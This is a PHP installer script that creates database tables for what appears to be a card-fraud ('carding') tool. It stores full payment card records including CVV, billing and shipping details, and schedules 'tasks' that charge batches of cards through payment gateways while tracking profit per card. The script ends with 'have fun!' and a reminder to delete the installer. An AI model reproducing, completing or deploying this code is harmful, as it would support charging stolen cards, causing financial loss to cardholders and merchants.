<?php
include("config.php");

$sqlInstall[] = "CREATE TABLE IF NOT EXISTS `cards` (
  `id` int(13) NOT NULL AUTO_INCREMENT,
  `info` text,
  `base` text,
  `firstName` text,
  `lastName` text,
  `number` text,
  `expiryMonth` text,
  `expiryYear` text,
  `startMonth` text,
  `startYear` text,
  `cvv` text,
  `issueNumber` text,
  `type` text,
  `billingAddress1` text,
  `billingAddress2` text,
  `billingCity` text,
  `billingPostcode` text,
  `billingState` text,
  `billingCountry` text,
  `billingPhone` text,
  `shippingAddress1` text,
  `shippingAddress2` text,
  `shippingCity` text,
  `shippingPostcode` text,
  `shippingState` text,
  `shippingCountry` text,
  `shippingPhone` text,
  `company` text,
  `email` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";

$sqlInstall[] = "CREATE TABLE IF NOT EXISTS `logs` (
  `id` int(9) NOT NULL AUTO_INCREMENT,
  `time` text,
  `status` text,
  `action` text,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";

$sqlInstall[] = "CREATE TABLE IF NOT EXISTS `payment_gateways` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `gateway` text,
  `nick` text,
  `params` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";

$sqlInstall[] = "CREATE TABLE IF NOT EXISTS `statistics` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `key` text NOT NULL,
  `val` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;";

$sqlInstall[] = "INSERT INTO `statistics` (`id`, `key`, `val`) VALUES
(1, 'profit', '0');";

$sqlInstall[] = "CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(3) NOT NULL AUTO_INCREMENT,
  `name` text,
  `base` text,
  `profit` text,
  `charge_per_card` text,
  `currency` text,
  `day_or_night` text,
  `cards_amount` text,
  `date_start` text,
  `date_end` text,
  `task_gateway` text,
  `last_run` text,
  `status` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;";

echo "Installing script started<br />";
$i = 1;
foreach($sqlInstall as $query) {
	$status = VoxisRunQuery($VoxisSqlLink, false, $query);
	if($status) {
		echo "Install stage <b>".$i."</b> completed successfully!<br />";
	} else {
		echo "Install stage <b>".$i."</b> failed!<br />";
	}
	$i++;
}
echo "All the stages passed successfully, have fun!<br />";
echo "(Don't forget to delete this file)";
?>